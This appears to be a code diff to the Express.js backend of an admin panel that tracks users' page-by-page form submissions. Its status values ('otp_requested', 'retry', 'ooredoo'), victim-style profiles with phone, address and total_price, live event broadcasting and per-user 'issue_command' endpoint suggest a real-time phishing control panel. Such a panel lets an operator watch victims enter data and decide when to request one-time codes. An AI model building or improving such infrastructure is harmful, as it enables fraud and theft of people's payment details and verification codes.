@@ -218,16 +218,28 @@ router.get('/conversation', requireAdmin, async (req, res) => {
   const submissions = await Submission.find({ user_id: user._id }).sort({ created_at: 1 });
   const messages = await Message.find({ user_id: user._id }).sort({ created_at: 1 });
   
+  // Build navigation dynamically from submissions
+  const pageMap = new Map();
+  submissions.forEach(sub => {
+    if (!pageMap.has(sub.page_key)) {
+      pageMap.set(sub.page_key, { key: sub.page_key, label_ar: sub.page_label, count: 0, has_data: true });
+    }
+    pageMap.get(sub.page_key).count += 1;
+  });
+  const navigation = Array.from(pageMap.values());
+
   res.json({
     ok: true,
-    conversation: user,
-    profile: {
-      name: user.name, phone: user.phone, address: user.address,
-      email: user.email, country: user.country, service: user.service, total_price: user.total_price
-    },
-    navigation: [], // Could be dynamically built based on submission keys
-    submissions,
-    messages
+    conversation: {
+      user: user,
+      profile: {
+        name: user.name, phone: user.phone, address: user.address,
+        email: user.email, country: user.country, service: user.service, total_price: user.total_price
+      },
+      navigation: navigation,
+      submissions: submissions,
+      messages: messages
+    }
   });
 });
 
@@ -249,9 +261,9 @@ router.post('/mark_read', requireAdmin, async (req, res) => {
 router.post('/set_status', requireAdmin, async (req, res) => {
   const { id, status } = req.body;
   const waiting = ['waiting', 'otp_requested', 'retry', 'ooredoo'].includes(status);
-  await User.findByIdAndUpdate(id, { status, waiting_for_decision: waiting });
+  const user = await User.findByIdAndUpdate(id, { status, waiting_for_decision: waiting }, { new: true });
   broadcastEvent('user.status', { id, status, waiting_for_decision: waiting });
-  res.json({ ok: true });
+  res.json({ ok: true, user });
 });
 
 // POST /api/issue_command
@@ -264,7 +276,7 @@ router.post('/issue_command', requireAdmin, async (req, res) => {
   await cmd.save();
 
   broadcastEvent('command.issued', { user_id: user._id, command, created_at: cmd.created_at });
-  res.json({ ok: true });
+  res.json({ ok: true, user });
 });
 
 // GET /api/stream (SSE)
